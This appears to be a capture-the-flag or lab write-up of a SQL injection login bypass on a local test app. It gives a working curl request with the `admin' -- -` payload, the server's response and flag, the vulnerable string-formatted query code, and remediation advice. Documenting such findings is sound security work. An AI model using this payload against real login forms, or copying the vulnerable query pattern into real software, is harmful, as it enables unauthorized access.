# Finding 1 — SQL Injection (authentication bypass)

- **Class:** SQL Injection (CWE-89) / OWASP A03:2021 — Injection
- **Endpoint:** `POST /login`
- **Severity:** Critical — full authentication bypass, logs in as `admin`.
- **Flag:** `FLAG{sqli_d14aa78ca248}`

## Request (reproducible)
```bash
curl -s -i -c cookies.txt \
  --data-urlencode "username=admin' -- -" \
  --data-urlencode "password=x" \
  http://127.0.0.1:5000/login
# then follow with the returned auth cookie:
curl -s -b cookies.txt http://127.0.0.1:5000/dashboard
```

Payload (username field): `admin' -- -`
Password: anything (`x`).

## Result (actual)
- `POST /login` -> `HTTP/1.1 302 FOUND`, `Location: /dashboard`,
  `Set-Cookie: auth=YWRtaW46YWRtaW4=` (base64 of `admin:admin`).
- `GET /dashboard` renders admin's private note:
  `Nice work bypassing the login. FLAG{sqli_d14aa78ca248}`

## Why it works
The login builds SQL by string formatting (app.py:212-216):
```python
query = ("SELECT id, username, role FROM users "
         "WHERE username = '%s' AND password = '%s'" % (username, password))
```
The injected username closes the string literal and comments out the rest,
yielding:
`SELECT ... WHERE username = 'admin' -- -' AND password = 'x'`
The password comparison is commented out, so the query returns the admin row
and the app issues an authenticated session.

## Remediation
- Use **parameterized queries / bound parameters**, never string formatting:
  `db.execute("SELECT ... WHERE username = ? AND password = ?", (u, p))`.
- Store only salted password **hashes** (e.g. bcrypt/argon2) and verify with a
  constant-time check; never compare plaintext.
- Apply least-privilege DB accounts and generic error messages (the app also
  leaks raw `sqlite3.Error` text, aiding an attacker).
